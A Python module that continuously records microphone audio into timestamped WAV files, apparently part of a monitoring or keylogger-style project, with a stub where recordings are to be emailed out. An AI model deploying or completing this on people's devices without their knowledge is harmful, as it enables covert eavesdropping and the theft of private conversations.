from sounddevice import rec, wait, stop
from scipy.io.wavfile import write
from datetime import datetime
from os.path import join
from time import sleep
from os import _exit
from config import (
    LOGS_DIRECTORY_PATH,
    MICROPHONE_INTERVAL,
    MICROPHONE_RECORDINGS_PER_EMAIL,
)
from utils.tools import log, get_timestamp


class MicrophoneLogger:
    def __init__(self):
        self.freq = 44100
        self.duration = MICROPHONE_INTERVAL
        self.logs_directory_path = (
            "" if not LOGS_DIRECTORY_PATH else LOGS_DIRECTORY_PATH
        )
        self.counter_max = MICROPHONE_RECORDINGS_PER_EMAIL
        self.counter = 0
        self.running = True

    def handle_counter(self):
        if self.counter >= self.counter_max:
            pass  # email logic here

    def record(self):
        recording = rec(
            int(self.duration * self.freq),
            samplerate=self.freq,
            channels=1,
            dtype="int16",
        )
        wait()
        write(
            join(self.logs_directory_path, f"microphone_{get_timestamp()}.wav"),
            self.freq,
            recording,
        )

    def run(self):
        try:
            while self.running:
                self.record()
                self.counter += 1
                self.handle_counter()
                sleep(self.duration + 1)
        except KeyboardInterrupt:
            self.running = False
        except Exception as e:
            self.running = False
            log("AN ERROR OCCURED WHILE LOGGING MICROPHONE:", "errors.txt")
            log(e, "errors.txt")
            return 1

        return 0


def main():
    microphone_logger = MicrophoneLogger()
    try:
        microphone_logger.run()
    except Exception:
        microphone_logger.running = False
        print("An error occured while logging microphone.")
        print(f"See error here: ")  # put the file path to where the error log is


if __name__ == "__main__":
    _exit(main())
